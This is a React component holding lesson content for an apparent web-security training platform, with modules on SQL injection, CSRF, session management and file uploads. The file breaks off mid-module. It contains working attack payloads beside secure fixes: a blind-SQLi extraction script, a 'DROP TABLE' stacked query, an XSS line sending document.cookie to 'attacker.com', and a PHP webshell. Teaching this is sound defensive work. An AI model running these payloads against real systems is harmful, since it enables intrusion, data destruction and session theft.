import { useState } from 'react';
import { X, CheckCircle, BookOpen, Code, Terminal, Lightbulb } from 'lucide-react';

interface ModuleContentProps {
  moduleName: string;
  level: string;
  onClose: () => void;
  onComplete?: () => void;
}

interface ContentSection {
  type: 'theory' | 'example' | 'code' | 'exercise' | 'tip';
  title: string;
  content: string;
  codeLanguage?: string;
}

export function ModuleContent({ moduleName, level, onClose, onComplete }: ModuleContentProps) {
  const [currentSection, setCurrentSection] = useState(0);
  const [completedSections, setCompletedSections] = useState<Set<number>>(new Set());

  const moduleContent: Record<string, ContentSection[]> = {
    'Advanced SQL Injection': [
      {
        type: 'theory',
        title: 'Blind SQL Injection Techniques',
        content: 'Blind SQL Injection occurs when an application is vulnerable to SQL injection but does not return query results or error messages. Attackers must use inference techniques to extract data.\n\nTypes of Blind SQLi:\n\n1. Boolean-based Blind:\n   - App responds differently based on true/false conditions\n   - Use AND/OR operators to construct queries\n   - Binary search to extract data character by character\n\n2. Time-based Blind:\n   - Database performs a time delay\n   - If condition is true, query sleeps\n   - Measure response time to determine truthfulness\n\n3. Out-of-band (OOB):\n   - Results sent through different channel (DNS, HTTP)\n   - Uses DNS requests or HTTP callbacks',
      },
      {
        type: 'code',
        title: 'Boolean-based Blind SQLi Example',
        content: `// Vulnerable code
app.get('/user', (req, res) => {
  const userId = req.query.id;
  const query = \`SELECT username FROM users WHERE id = '\${userId}'\`;
  const result = db.query(query);

  // Response doesn't show data, just success/failure
  res.json({ found: result.length > 0 });
});

// Attack: Extract admin password character by character
// Payload: 1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a
// If response is {found: true}, first char is 'a'

// More advanced: Use SLEEP for time-based
// Payload: 1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
// If response takes 5 seconds, first char is 'a'`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Binary Search Extraction Script',
        content: `// Automated blind SQL injection extraction
async function extractPassword(targetUser) {
  let password = '';
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';

  for (let pos = 1; pos <= 50; pos++) {
    for (const char of chars) {
      const payload = \`1' AND SUBSTRING((
        SELECT password FROM users
        WHERE username='\${targetUser}'
      ),\${pos},1)='\${char}\`;

      const start = Date.now();
      const response = await fetch(\`/user?id=\${encodeURIComponent(payload)}\`);
      const time = Date.now() - start;

      if (time > 3000) { // Delay detected
        password += char;
        console.log(\`Found char: \${char}, Password: \${password}\`);
        break;
      }
    }
  }
  return password;
}`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Advanced Payloads',
        content: 'Stacked Queries (if supported):\n• 1; DROP TABLE users;--\n• 1; UPDATE users SET admin=1 WHERE id=1;--\n\nUnion-based with Obfuscation:\n• 1 UNION/**/SELECT username,password FROM users\n• 1 UNION SELECT username, password FROM users WHERE 1=1\n\nSecond-order Injection:\n• Store malicious payload in database\n• Payload executed when data is retrieved later\n• Example: Comment field → retrieved in admin panel\n\nHexadecimal Encoding:\n• UNION SELECT 0x61646d696e (hex for "admin")\n• Bypasses simple string filters',
      },
      {
        type: 'exercise',
        title: 'Advanced SQLi Challenges',
        content: 'Challenge 1: Blind SQL Injection\n• Application only responds with true/false\n• Extract admin password using boolean-based blind\n• Hint: Use SUBSTRING and comparison operators\n\nChallenge 2: Time-based Blind\n• Database doesn\'t return errors\n• Extract data by measuring response time\n• Payload: id=1\' AND IF(condition, SLEEP(5), 0)--\n\nChallenge 3: Union-based with Encoding\n• Application filters some keywords\n• Use hexadecimal encoding\n• Extract data from multiple tables\n\nChallenge 4: Chained Exploitation\n• Combine SQLi with authentication bypass\n• Extract credentials and gain admin access',
      },
      {
        type: 'tip',
        title: 'Advanced Prevention',
        content: '✓ Use parameterized queries with all inputs\n✓ Implement Web Application Firewall (WAF)\n✓ Use database encryption and tokenization\n✓ Apply principle of least privilege to DB accounts\n✓ Monitor and log all database queries\n✓ Implement rate limiting on failed queries\n✓ Use tools like SQLMap for vulnerability testing\n✓ Regular penetration testing by professionals\n✓ Keep database software updated\n✓ Use stored procedures (with parameters)',
      },
    ],
    'CSRF Attacks': [
      {
        type: 'theory',
        title: 'Cross-Site Request Forgery (CSRF)',
        content: 'CSRF (Cross-Site Request Forgery) exploits the trust a website has in a user\'s browser. If a user is authenticated on Site A, an attacker can trick them into making unwanted requests to Site A from Site B.\n\nHow CSRF works:\n1. User logs into banking website\n2. User visits attacker\'s website (in another tab)\n3. Attacker\'s site makes a request to bank (transfer money)\n4. Browser automatically includes authentication cookies\n5. Bank processes the unauthorized transaction\n\nCSRF vs XSS:\n• XSS: Attacker runs code in victim\'s browser\n• CSRF: Victim\'s browser makes unwanted requests\n\nAttack Requirements:\n• User must be authenticated\n• Attacker knows the action to perform\n• No CSRF token or weak token validation',
      },
      {
        type: 'code',
        title: 'CSRF Vulnerability Example',
        content: `// Vulnerable bank application
app.post('/transfer', (req, res) => {
  const { amount, account } = req.body;
  const userId = req.session.userId;

  // No CSRF token check!
  db.transfer(userId, account, amount);
  res.json({ success: true });
});

// Attacker's website
<!-- Evil website: attacker.com -->
<img src="https://bank.com/transfer?amount=1000&account=attacker" />

<!-- Alternative: Form submission -->
<form id="evil" action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000" />
  <input name="account" value="attacker" />
</form>
<script>
  document.getElementById('evil').submit();
</script>`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Secure CSRF Protection',
        content: `// Using CSRF tokens
const session = require('express-session');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: true
}));

const csrfProtection = csrf({ cookie: false });

// Generate token for form
app.get('/transfer-form', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

// Validate token on submission
app.post('/transfer', csrfProtection, (req, res) => {
  const { amount, account, _csrf } = req.body;

  // Token is automatically validated by middleware
  if (!req.csrfToken() || req.body._csrf !== req.csrfToken()) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  const userId = req.session.userId;
  db.transfer(userId, account, amount);
  res.json({ success: true });
});`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'CSRF Attack Scenarios',
        content: 'Email-based CSRF:\n• Attacker sends email with malicious image tag\n• User clicks link while logged in\n• Request made automatically via image src\n\nSession riding:\n• Attacker uses victim\'s active session\n• Performs actions as authenticated user\n• Especially dangerous for financial transactions\n\nChained CSRF + XSS:\n• XSS vulnerability extracts CSRF token\n• Use stolen token in CSRF attack\n• Bypasses CSRF protection\n\nJSON-based CSRF:\n• Attacker submits JSON requests\n• Browsers less protective of JSON from cross-origin\n• Can steal sensitive data',
      },
      {
        type: 'exercise',
        title: 'CSRF Practice Exercises',
        content: 'Exercise 1: Basic CSRF Attack\n• Create malicious webpage\n• Trick user into making unauthorized transfer\n• Observe successful transaction\n\nExercise 2: Token Extraction\n• Extract CSRF token from vulnerable form\n• Use token to create valid CSRF payload\n• Execute unauthorized action\n\nExercise 3: Bypass Weak Token Validation\n• Discover CSRF token generation pattern\n• Predict or brute force valid tokens\n• Execute attack with predicted token\n\nExercise 4: XSS + CSRF Chaining\n• Use XSS to extract CSRF token\n• Combine with CSRF attack\n• Bypass traditional CSRF protection',
      },
      {
        type: 'tip',
        title: 'CSRF Prevention Methods',
        content: '✓ Implement CSRF tokens in all state-changing requests\n✓ Use SameSite cookie attribute (Strict/Lax)\n✓ Validate Referer and Origin headers\n✓ Implement double-submit cookie pattern\n✓ Use proper CORS policies\n✓ Require re-authentication for sensitive actions\n✓ Implement per-request tokens (not session-wide)\n✓ Use POST instead of GET for state changes\n✓ Educate users about phishing risks\n✓ Monitor unusual access patterns',
      },
    ],
    'Session Management': [
      {
        type: 'theory',
        title: 'Session Security Vulnerabilities',
        content: 'Session management controls how users stay authenticated. Vulnerabilities include:\n\n1. Session Fixation:\n   - Attacker forces a known session ID\n   - User logs in with attacker\'s session\n   - Attacker hijacks user\'s authenticated session\n\n2. Session Hijacking:\n   - Attacker steals session cookie/token\n   - Uses it to impersonate user\n   - Can be done via XSS, man-in-the-middle, or network sniffing\n\n3. Weak Session IDs:\n   - Predictable session identifiers\n   - Can be brute forced or guessed\n   - Insufficient entropy/randomness\n\n4. Insecure Session Storage:\n   - Session data stored insecurely\n   - Accessible by other applications\n   - No encryption on sensitive data',
      },
      {
        type: 'code',
        title: 'Vulnerable Session Management',
        content: `// INSECURE: Weak session ID generation
function generateSessionId() {
  return Math.random().toString(36).substring(7); // Predictable!
}

// INSECURE: Session fixation vulnerability
app.get('/login', (req, res) => {
  const sessionId = req.query.sid || generateSessionId();
  req.session.id = sessionId;
  // Session ID not regenerated after login
  res.redirect('/');
});

// INSECURE: Session stored in localStorage
localStorage.setItem('sessionId', sessionId); // Vulnerable to XSS

// INSECURE: No HTTPOnly flag
res.cookie('sessionId', sessionId, { secure: false }); // Can be accessed by JS

// INSECURE: No expiration
app.get('/profile', (req, res) => {
  if (req.session.userId) {
    // Session never expires
    res.json(getUserData(req.session.userId));
  }
});`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Secure Session Management',
        content: `const crypto = require('crypto');

// SECURE: Generate cryptographically secure session ID
function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}

// SECURE: Regenerate session after login
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);

  if (user) {
    // Regenerate session to prevent fixation
    req.session.regenerate(() => {
      req.session.userId = user.id;
      req.session.email = user.email;
      res.json({ success: true });
    });
  }
});

// SECURE: Use secure session middleware
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: redisStore, // Use external store (Redis)
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true, // No JavaScript access
    sameSite: 'strict',
    maxAge: 1800000 // 30 minutes
  }
}));

// SECURE: Validate and rotate sessions
app.get('/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  // Check if session is still valid
  if (Date.now() - req.session.lastActivity > 1800000) {
    req.session.destroy();
    return res.status(401).json({ error: 'Session expired' });
  }

  req.session.lastActivity = Date.now();
  res.json(getUserData(req.session.userId));
});`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'Session Attack Techniques',
        content: 'Session Fixation Attack:\n• Attacker creates session: GET /login?sid=ATTACKER_SID\n• Forces user to same URL\n• User logs in with attacker\'s session ID\n• Attacker uses that session ID to access account\n\nCookie Theft via XSS:\n• XSS payload: <script>fetch(\'https://attacker.com?c=\'+document.cookie)</script>\n• Attacker receives session cookie\n• Uses stolen cookie to make requests\n\nNetwork Sniffing:\n• Attacker on same network\n• Intercepts HTTP traffic (not HTTPS)\n• Captures session cookie from packets\n\nBrute Force Session IDs:\n• Sequential session IDs: 1, 2, 3...\n• Predictable format: timestamp_random\n• Attacker iterates through possibilities',
      },
      {
        type: 'exercise',
        title: 'Session Security Challenges',
        content: 'Challenge 1: Session Fixation\n• Create session with known ID\n• Trick user into logging in with that ID\n• Hijack the authenticated session\n\nChallenge 2: Session ID Prediction\n• Capture multiple session IDs\n• Identify the pattern\n• Predict next session ID and gain access\n\nChallenge 3: Cookie Theft and Replay\n• Use XSS to steal session cookie\n• Replay stolen cookie to access account\n• Observe lack of additional validation\n\nChallenge 4: Expired Session Bypass\n• Discover that expired sessions aren\'t invalidated\n• Use old session cookie for unauthorized access\n• Bypass timeout mechanisms',
      },
      {
        type: 'tip',
        title: 'Session Security Best Practices',
        content: '✓ Regenerate session IDs after login and privilege escalation\n✓ Use cryptographically secure random number generator\n✓ Set HTTPOnly and Secure flags on cookies\n✓ Use SameSite cookie attribute\n✓ Implement session timeout and absolute expiration\n✓ Validate session on every request\n✓ Store sessions server-side (use Redis, database)\n✓ Bind sessions to IP/User-Agent (with caution)\n✓ Implement logout functionality\n✓ Use HTTPS for all communication\n✓ Monitor for suspicious session activity',
      },
    ],
    'File Upload Vulnerabilities': [
      {
        type: 'theory',
        title: 'Exploiting File Upload Flaws',
        content: 'Unrestricted file uploads allow attackers to:\n• Upload malicious code for RCE\n• Overwrite existing files\n• Cause denial of service\n• Bypass authentication\n• Execute arbitrary commands\n\nVulnerable Scenarios:\n1. No File Type Validation:\n   - Accept any file type\n   - Upload PHP/JSP/ASP shells\n\n2. Weak Extension Checks:\n   - Only check file extension\n   - Rename .php to .php.jpg\n   - Double extensions: .php.pdf\n\n3. MIME Type Spoofing:\n   - Only validate MIME type\n   - Attacker changes Content-Type header\n   - Upload PHP as image\n\n4. Path Traversal:\n   - Upload to arbitrary directory\n   - Use ../ in filename\n   - Overwrite system files',
      },
      {
        type: 'code',
        title: 'Vulnerable File Upload Code',
        content: `// INSECURE: No validation
app.post('/upload', (req, res) => {
  const file = req.files.document;
  const uploadPath = __dirname + '/uploads/' + file.name;

  file.mv(uploadPath, (err) => {
    if (err) return res.status(500).send(err);
    res.send('File uploaded!');
  });
});

// INSECURE: Only extension check
app.post('/upload', (req, res) => {
  const file = req.files.document;
  const ext = file.name.split('.').pop();

  if (ext !== 'jpg' && ext !== 'png') {
    return res.status(400).send('Invalid file type');
  }

  // Can bypass with .php.jpg or .phtml
  file.mv(__dirname + '/uploads/' + file.name);
  res.send('File uploaded!');
});

// INSECURE: Only MIME type check
app.post('/upload', (req, res) => {
  const file = req.files.document;

  if (file.mimetype !== 'image/jpeg') {
    return res.status(400).send('Invalid file type');
  }

  // Attacker changes Content-Type header
  file.mv(__dirname + '/uploads/' + file.name);
  res.send('File uploaded!');
});`,
        codeLanguage: 'javascript',
      },
      {
        type: 'code',
        title: 'Secure File Upload Implementation',
        content: `const crypto = require('crypto');
const path = require('path');
const fileType = require('file-type');

// SECURE: Comprehensive validation
app.post('/upload', async (req, res) => {
  try {
    const file = req.files.document;

    // 1. File size check
    if (file.size > 5 * 1024 * 1024) { // 5MB limit
      return res.status(400).send('File too large');
    }

    // 2. Check magic bytes (file signature)
    const type = await fileType.fromBuffer(file.data);
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];

    if (!type || !allowedTypes.includes(type.mime)) {
      return res.status(400).send('Invalid file type');
    }

    // 3. Generate safe filename (remove path traversal)
    const safeFilename = crypto.randomBytes(16).toString('hex') +
                        path.extname(file.name).toLowerCase();

    // 4. Validate filename
    if (path.resolve(__dirname + '/uploads/' + safeFilename)
        !== path.resolve(__dirname + '/uploads/') + '/' + safeFilename) {
      return res.status(400).send('Invalid filename');
    }

    // 5. Save with restricted permissions
    const uploadPath = __dirname + '/uploads/' + safeFilename;
    file.mv(uploadPath, (err) => {
      if (err) return res.status(500).send(err);

      // Store metadata in database
      db.insert({
        filename: safeFilename,
        originalName: file.name,
        mimetype: type.mime,
        userId: req.session.userId
      });

      res.json({ filename: safeFilename });
    });

  } catch (err) {
    res.status(500).send('Upload error');
  }
});`,
        codeLanguage: 'javascript',
      },
      {
        type: 'example',
        title: 'File Upload Attack Payloads',
        content: 'PHP Webshell Upload:\n• Filename: shell.php (or shell.php.jpg)\n• Content: <?php system($_GET[\'cmd\']); ?>\n• Access via: /uploads/shell.php?cmd=id\n\nDouble Extension Bypass:\n• Filename: shell.php.jpg\n• Server misconfiguration executes as PHP\n• Payload: shell.phtml, shell.php5\n\nNull Byte Injection:\n• Filename: shell.php%00.jpg\n• Old servers truncate at null byte\n• Saved as shell.php\n\nPath Traversal Upload:\n• Filename: ../../admin/shell.php\n• Bypasses upload directory restriction\n• Uploads to web root\n\nZIP Extraction Exploit:\n• Upload ZIP with path traversal\n• Server auto-extracts files\n• Files written to arbitrary locations',
      },
      {
        type: 'exercise',
        title: 'File Upload Exploitation Challenges',
        content: 'Challenge 1: Bypass Extension Filter\n• Application checks file extension\n• Find bypass (double extension, null byte, etc.)\n• Upload executable file\n• Execute commands on server\n\nChallenge 2: MIME Type Spoofing\n• Change Content-Type header\n• Upload PHP file as image\n• Access uploaded file and execute code\n\nChallenge 3: Path Traversal Upload\n• Manipulate filename with ../\n• Write file outside upload directory\n• Overwrite critical files\n\nChallenge 4: Full RCE Chain\n• Upload webshell using multiple bypasses\n• Execute arbitrary commands\n• Read sensitive files\n• Gain system-level access',
      },
      {
        type: 'tip',
        title: 'File Upload Security Best Practices',
        content: '✓ Validate file content (magic bytes), not just extension\n✓ Generate random filenames\n✓ Store uploads outside web root\n✓ Limit file size\n✓ Use whitelist for allowed types\n✓ Disable script execution in upload directory\n✓ Set proper file permissions (644)\n✓ Scan files with antivirus/malware scanner\n✓ Validate filename against path traversal\n✓ Implement rate limiting on uploads\n✓ Use virus scanning libraries (ClamAV)\n✓ Store file metadata in database',
      },
    ],
    'Introduction to Web Security': [
      {
        type: 'theory',
        title: 'What is Web Security? (For Complete Beginners)',
        content: 'Imagine your website is like a house. Web security is like having locks on doors, alarms, and security cameras to protect your house from bad people trying to break in.\n\n🏠 SIMPLE ANALOGY:\nWebsite = Your House\nVisitors = Website Users\nDoors/Windows = Input Fields (forms, search boxes)\nBad Guys = Hackers trying to break in\n\n📚 WHAT YOU WILL LEARN:\n• How websites work (like how your house works)\n• Where hackers try to break in (the weak spots)\n• How to protect websites (locks and alarms)\n• Ethical hacking (being a good security guard)\n\n🎯 WHY THIS MATTERS:\n• Websites handle your personal information\n• Credit cards, passwords, private messages\n• Hackers steal this information if not protected\n• YOU can learn to protect websites!\n\n🌐 HOW WEBSITES WORK (SUPER SIMPLE):\n1. You type a website address (like www.example.com)\n2. Your browser (Chrome, Firefox) sends a request\n3. The server (big computer) sends back the website\n4. You see the website on your screen\n\n💡 SECURITY BASICS:\nThink of security like layers of protection:\n• Front door lock (password)\n• Alarm system (firewall)\n• Security cameras (monitoring)\n• Guard dog (antivirus)\n\nAll these work together to keep you safe!',
      },
      {
        type: 'theory',
        title: 'Ethical Hacking: The Good Guys',
        content: '🦸 WHAT IS ETHICAL HACKING?\n\nEthical hackers are like security guards who test if your locks work. They try to break in (WITH PERMISSION) to find weak spots before bad hackers do.\n\n✅ ETHICAL HACKER (Good Guy):\n• Gets PERMISSION before testing\n• Reports problems to the owner\n• Helps fix security issues\n• Follows the law\n• Gets paid legally\n\n❌ BAD HACKER (Criminal):\n• Breaks in without permission\n• Steals information\n• Damages systems\n• Breaks the law\n• Goes to jail\n\n⚖️ THE GOLDEN RULES:\n1. ALWAYS GET PERMISSION first\n2. NEVER attack systems you don\'t own\n3. REPORT vulnerabilities responsibly\n4. RESPECT privacy and laws\n5. USE skills to help, not harm\n\n🎓 BECOMING AN ETHICAL HACKER:\n• Learn how websites work\n• Understand common attacks\n• Practice in safe environments (like this platform)\n• Get certifications (CEH, OSCP)\n• Join bug bounty programs\n• Always follow ethical guidelines\n\n📜 LEGAL CONSIDERATIONS:\n• Computer Fraud and Abuse Act (USA)\n• Unauthorized access is ILLEGAL\n• Even good intentions = jail if no permission\n• Always use legal testing platforms\n• Document your work and permissions\n\n🎯 YOUR RESPONSIBILITY:\nWith great power comes great responsibility. You\'re learning powerful skills. Use them to protect people, not harm them.',
      },
      {
        type: 'example',
        title: 'Common Web Vulnerabilities (Explained Simply)',
        content: '🔍 TOP 10 SECURITY PROBLEMS IN WEBSITES:\n\n1️⃣ INJECTION ATTACKS (Like sneaking bad instructions)\n   Simple: Imagine telling someone "close the door" but also sneaking in "and unlock the safe"\n   Real: Hacker adds secret commands to your input\n   Example: Instead of username, typing: admin\' OR \'1\'=\'1\n\n2️⃣ BROKEN AUTHENTICATION (Weak locks)\n   Simple: Using "password123" as your password\n   Real: Weak passwords, no login protection\n   Example: Trying admin/admin and it works!\n\n3️⃣ SENSITIVE DATA EXPOSURE (Leaving secrets visible)\n   Simple: Writing your bank PIN on your debit card\n   Real: Storing passwords without encryption\n   Example: Database shows passwords in plain text\n\n4️⃣ BROKEN ACCESS CONTROL (Wrong people getting in)\n   Simple: Student accessing teacher\'s computer\n   Real: Regular user accessing admin features\n   Example: Changing URL from user/1 to user/2 shows other user\'s data\n\n5️⃣ SECURITY MISCONFIGURATION (Leaving windows open)\n   Simple: Forgetting to lock your back door\n   Real: Default passwords, error messages showing too much\n   Example: Seeing detailed error with database password\n\n6️⃣ CROSS-SITE SCRIPTING (XSS) (Poisoning the water)\n   Simple: Someone adds poison to the town water supply\n   Real: Hacker injects bad code into website\n   Example: Comment section runs JavaScript alert(\'hacked\')\n\n7️⃣ INSECURE DESERIALIZATION (Trojan horse)\n   Simple: Enemy soldiers hiding in a gift box\n   Real: Malicious code hidden in data\n   Example: Uploaded file contains secret commands\n\n8️⃣ USING VULNERABLE COMPONENTS (Old, broken locks)\n   Simple: Using a 50-year-old rusty lock\n   Real: Outdated software with known problems\n   Example: WordPress plugin from 2015 with security holes\n\n9️⃣ INSUFFICIENT LOGGING (No security cameras)\n   Simple: No record of who entered the building\n   Real: Not tracking what happens on website\n   Example: Hacker breaks in and leaves no trace\n\n🔟 INJECTION IN DIFFERENT FORMS\n   Simple: Different ways to sneak in bad instructions\n   Real: SQL, OS commands, LDAP injection\n   Example: Typing commands that server executes\n\n💡 REMEMBER: All these are like different ways to break into a house. Each needs different protection!',
      },
      {
        type: 'code',
        title: 'Your First Security Lesson: Safe vs Unsafe Code',
        content: `// ❌ BAD CODE (UNSAFE - Don't do this!)
// This is like leaving your front door wide open

// Taking user input and using it directly
const username = getUserInput(); // User types: admin' OR '1'='1
const query = "SELECT * FROM users WHERE name = '" + username + "'";
// The query becomes: SELECT * FROM users WHERE name = 'admin' OR '1'='1'
// This returns ALL users because 1=1 is always true!

database.runQuery(query); // DANGER! Hacker can now see everyone's data


// ✅ GOOD CODE (SAFE - Do this instead!)
// This is like having a security guard check everyone

// Method 1: Using safe parameters (BEST WAY)
const username = getUserInput(); // Even if user types: admin' OR '1'='1
const query = "SELECT * FROM users WHERE name = ?"; // The ? is a placeholder
database.runQuery(query, [username]); // Username is treated as TEXT ONLY
// No matter what user types, it's just treated as a name, not code!


// Method 2: Cleaning the input (Good but not perfect)
function cleanInput(userInput) {
  // Remove all dangerous characters
  return userInput
    .replace(/['"]/g, '')  // Remove quotes
    .replace(/[;<>]/g, '') // Remove special characters
    .substring(0, 50);     // Limit length
}

const safeUsername = cleanInput(getUserInput());
const query = "SELECT * FROM users WHERE name = '" + safeUsername + "'";


// 🎯 WHY THE SAFE VERSION WORKS:
// 1. The database treats user input as DATA, not CODE
// 2. Special characters don't break the query
// 3. Even if hacker types malicious code, it's ignored
// 4. Your data stays safe!

// 🏆 BEST PRACTICE:
// Always use parameterized queries (Method 1)
// NEVER put user input directly into queries`,
        codeLanguage: 'javascript',
      },
      {
        type: 'exercise',
        title: 'Your First Hacking Challenge (Ethical & Legal)',
        content: '🎮 BEGINNER SECURITY CHALLENGE:\n\nLet\'s practice finding problems in code. Remember: This is LEGAL because you have permission on this platform!\n\n📝 THE CHALLENGE:\nLook at this search feature code:\n\napp.get(\'/search\', (req, res) => {\n  const searchWord = req.query.q;\n  res.send("<h1>You searched for: " + searchWord + "</h1>");\n});\n\n🔍 FIND THE PROBLEMS:\n\nProblem 1: NO INPUT CHECKING\n• The code accepts ANYTHING you type\n• No limit on length (could type 1 million characters)\n• No checking for bad characters\n• It\'s like accepting any package without checking inside\n\nProblem 2: DIRECT CONCATENATION (Joining text directly)\n• The code adds your input directly to HTML\n• If you type: <script>alert(\'hacked\')</script>\n• The website will RUN that code!\n• It\'s like reading every note someone gives you out loud\n\nProblem 3: NO ENCODING/ESCAPING\n• Special characters should be converted to safe text\n• < should become &lt; (safe version)\n• > should become &gt; (safe version)\n• Without this, dangerous code can run\n\nProblem 4: MISSING SECURITY HEADERS\n• No Content-Security-Policy (CSP)\n• CSP is like a whitelist of allowed code\n• Without it, ANY code can run\n\n💡 HOW TO FIX IT:\n\nfunction searchSafely(req, res) {\n  let searchWord = req.query.q;\n  \n  // Step 1: Validate (check if input is okay)\n  if (!searchWord || searchWord.length > 100) {\n    return res.send("Invalid search");\n  }\n  \n  // Step 2: Escape dangerous characters\n  searchWord = escapeHtml(searchWord);\n  // Now <script> becomes &lt;script&gt; (safe text)\n  \n  // Step 3: Use safely\n  res.send("<h1>You searched for: " + searchWord + "</h1>");\n}\n\n🎯 TRY IT YOURSELF:\n1. Go to our XSS lab\n2. Try typing: <script>alert(\'test\')</script>\n3. See what happens!\n4. Then try the same on the fixed version\n5. Notice the difference?\n\n✅ YOU JUST LEARNED:\n• How to spot unsafe code\n• Why input validation matters\n• How to fix security problems\n• Ethical hacking basics!',
      },
      {
        type: 'tip',
        title: 'Golden Rules for Web Security (Remember These!)',
        content: '🏆 THE SECURITY CHECKLIST (Print this out!):\n\n✅ RULE 1: NEVER TRUST USER INPUT\n   • Treat everything users type as potentially dangerous\n   • Like not eating food from strangers\n   • Always validate, clean, and check inputs\n   • Set maximum lengths and allowed characters\n\n✅ RULE 2: USE HTTPS EVERYWHERE\n   • HTTP = Sending postcards (anyone can read)\n   • HTTPS = Sending locked boxes (encrypted)\n   • Never send passwords over HTTP\n   • Look for the padlock icon in browser\n\n✅ RULE 3: STRONG AUTHENTICATION\n   • Passwords: At least 12 characters, mix of types\n   • Use password managers (LastPass, 1Password)\n   • Enable Two-Factor Authentication (2FA)\n   • Never use: password123, admin, qwerty\n\n✅ RULE 4: KEEP EVERYTHING UPDATED\n   • Old software = old locks that hackers know how to pick\n   • Update your framework, libraries, plugins\n   • Subscribe to security bulletins\n   • Set up automatic updates when possible\n\n✅ RULE 5: USE SECURITY HEADERS\n   • Content-Security-Policy: Controls what code can run\n   • X-Frame-Options: Prevents clickjacking\n   • X-XSS-Protection: Browser\'s XSS filter\n   • Think of these as extra locks on doors\n\n✅ RULE 6: LOG AND MONITOR\n   • Keep records of everything (who, what, when)\n   • Like security camera footage\n   • Check logs regularly for suspicious activity\n   • Set up alerts for unusual patterns\n\n✅ RULE 7: PRINCIPLE OF LEAST PRIVILEGE\n   • Give users ONLY what they need\n   • Regular user shouldn\'t access admin panel\n   • Database user shouldn\'t delete tables\n   • Like not giving house keys to everyone\n\n✅ RULE 8: ENCRYPT SENSITIVE DATA\n   • Passwords: Use bcrypt or Argon2\n   • Credit cards: Use tokenization\n   • Personal info: Encrypt at rest\n   • Like storing valuables in a safe\n\n✅ RULE 9: HAVE A BACKUP PLAN\n   • Regular backups of data\n   • Incident response plan\n   • Know what to do if hacked\n   • Like having insurance\n\n✅ RULE 10: ETHICAL HACKING MINDSET\n   • Always get permission first\n   • Document your findings\n   • Report responsibly\n   • Never harm or steal\n   • Use power for good\n\n📚 STUDY RESOURCES:\n• OWASP.org (free security guides)\n• HackerOne (bug bounty platform)\n• PortSwigger Academy (free web security)\n• This platform (hands-on practice)\n\n🎯 YOUR MISSION:\nBecome a security defender. Learn to think like a hacker, but act like a protector. The internet needs good people like you!',
      },
    ],
    'SQL Injection Basics': [
      {
        type: 'theory',
        title: 'SQL Injection Explained Like You\'re Five',
        content: '🍪 THE COOKIE JAR STORY:\n\nImagine you have a robot that guards a cookie jar. You ask: "Robot, give me MY cookies" and it gives you yours.\n\nBut what if you said: "Robot, give me MY cookies OR give me ALL cookies"?\n\nThe confused robot gives you EVERYTHING!\n\nThat\'s SQL Injection.\n\n🤖 WHAT IS SQL?\n\nSQL (Structured Query Language) is the language computers use to talk to databases.\n\nThink of it like this:\n• Database = Library with millions of books\n• SQL = The way you ask the librarian for books\n• Tables = Shelves in the library\n• Rows = Individual books\n• Columns = Book information (title, author, year)\n\nNormal SQL:\n"Please give me the book where title = \'Harry Potter\'"\n\nMalicious SQL:\n"Please give me the book where title = \'Harry Potter\' OR give me ALL books"\n\n🎯 HOW SQL INJECTION WORKS (STEP BY STEP):\n\nStep 1: Website asks for your username\n  Website: "What\'s your username?"\n  Normal user: "john"\n  \nStep 2: Website creates a query\n  Query: SELECT * FROM users WHERE username = \'john\'\n  Translation: "Show me the user named john"\n  \nStep 3: ATTACK - Hacker types special characters\n  Hacker types: admin\' --\n  Query becomes: SELECT * FROM users WHERE username = \'admin\' --\' AND password = \'...\'\n  The -- comments out the rest (password check disappears!)\n  Translation: "Show me admin user, ignore everything after this"\n  \nStep 4: Hacker gets in WITHOUT password!\n\n⚠️ TYPES OF SQL INJECTION:\n\n1️⃣ CLASSIC SQLi (You see results immediately)\n   • Type payload in search box\n   • Website shows you the data\n   • Like asking robot and it answers right away\n   \n2️⃣ BLIND SQLi (No direct results)\n   • Website doesn\'t show data\n   • But acts differently if you\'re right\n   • Like robot nodding yes/no\n   • Takes longer but still works\n   \n3️⃣ TIME-BASED BLIND (Watch the clock)\n   • Make database sleep for 5 seconds\n   • If response takes 5 seconds = you\'re right\n   • Like robot pausing when answer is yes\n\n🎓 ETHICAL HACKING NOTE:\nOnly practice SQL injection on:\n✅ This learning platform\n✅ Systems you own\n✅ Bug bounty programs with permission\n✅ Intentionally vulnerable apps (like DVWA)\n\n❌ NEVER on:\n• Real company websites\n• School/work systems\n• Any system without written permission',
      },
      {
        type: 'theory',
        title: 'Why SQL Injection is Dangerous (Real Stories)',
